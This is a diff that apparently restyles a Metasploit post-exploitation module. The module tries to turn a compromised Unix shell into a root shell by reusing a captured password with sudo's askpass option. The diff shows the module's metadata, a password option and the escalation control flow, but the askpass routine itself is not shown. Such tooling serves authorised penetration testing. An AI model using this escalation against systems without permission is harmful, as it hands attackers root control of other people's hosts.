@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -7,39 +8,37 @@ require 'msf/core'
 require 'rex'
 
 class MetasploitModule < Msf::Post
-
   include Msf::Post::File
   include Msf::Post::Linux::Priv
   include Msf::Post::Linux::System
 
+  def initialize(info = {})
+    super(update_info(info,
+                      'Name'          => 'Multiple Linux / Unix Post Sudo Upgrade Shell',
+                      'Description'   => %q(
+                        This module attempts to upgrade a shell account to UID 0 by reusing the
+                        given password and passing it to sudo. This technique relies on sudo
+                        versions from 2008 and later which support -A.
+                      ),
+                      'License'       => MSF_LICENSE,
+                      'Author'        =>
+                        [
+                          'todb <todb[at]metasploit.com>',
+                          'Ryan Baxendale <rbaxendale[at]gmail.com>' # added password option
+                        ],
+                      'Platform'      => %w(aix linux osx solaris unix),
+                      'References'    =>
+                        [
+                          # Askpass first added March 2, 2008, looks like
+                          [ 'URL', 'http://www.sudo.ws/repos/sudo/file/05780f5f71fd/sudo.h']
+                        ],
+                      'SessionTypes'  => [ 'shell' ]) # Need to test 'meterpreter')
 
-  def initialize(info={})
-    super( update_info( info,
-        'Name'          => 'Multiple Linux / Unix Post Sudo Upgrade Shell',
-        'Description'   => %q{
-          This module attempts to upgrade a shell account to UID 0 by reusing the
-          given password and passing it to sudo. This technique relies on sudo
-          versions from 2008 and later which support -A.
-        },
-        'License'       => MSF_LICENSE,
-        'Author'        =>
-          [
-            'todb <todb[at]metasploit.com>',
-            'Ryan Baxendale <rbaxendale[at]gmail.com>' #added password option
-          ],
-        'Platform'      => %w{ aix linux osx solaris unix },
-        'References'    =>
-          [
-            # Askpass first added March 2, 2008, looks like
-            [ 'URL', 'http://www.sudo.ws/repos/sudo/file/05780f5f71fd/sudo.h']
-          ],
-        'SessionTypes'  => [ 'shell' ] # Need to test 'meterpreter'
-      ))
-
-      register_options(
-        [
-          OptString.new('PASSWORD', [false, 'The password to use when running sudo.'])
-        ], self.class)
+    register_options(
+      [
+        OptString.new('PASSWORD', [false, 'The password to use when running sudo.'])
+      ], self.class
+    )
   end
 
   # Run Method for when run command is issued
@@ -54,15 +53,15 @@ class MetasploitModule < Msf::Post
       print_error "No sudo binary available. Aborting."
       return
     end
-    get_root()
+    get_root
   end
 
   def get_root
-    if datastore['PASSWORD']
-      password = datastore['PASSWORD']
-    else
-      password = session.exploit_datastore['PASSWORD']
-    end
+    password = if datastore['PASSWORD']
+                 datastore['PASSWORD']
+               else
+      session.exploit_datastore['PASSWORD']
+               end
 
     if password.to_s.empty?
       print_status "No password available, trying a passwordless sudo."
@@ -70,15 +69,15 @@ class MetasploitModule < Msf::Post
       print_status "Sudoing with password `#{password}'."
     end
     askpass_sudo(password)
-    unless is_root?
-      print_error "SUDO: Didn't work out, still a mere user."
-    else
+    if is_root?
       print_good "SUDO: Root shell secured."
       report_note(
-        :host => session,
-        :type => "host.escalation",
-        :data => "User `#{session.exploit_datastore['USERNAME']}' sudo'ed to a root shell"
+        host: session,
+        type: "host.escalation",
+        data: "User `#{session.exploit_datastore['USERNAME']}' sudo'ed to a root shell"
       )
+    else
+      print_error "SUDO: Didn't work out, still a mere user."
     end
   end
 
@@ -132,5 +131,4 @@ class MetasploitModule < Msf::Post
       print_error "Timed out during sudo cleanup."
     end
   end
-
 end
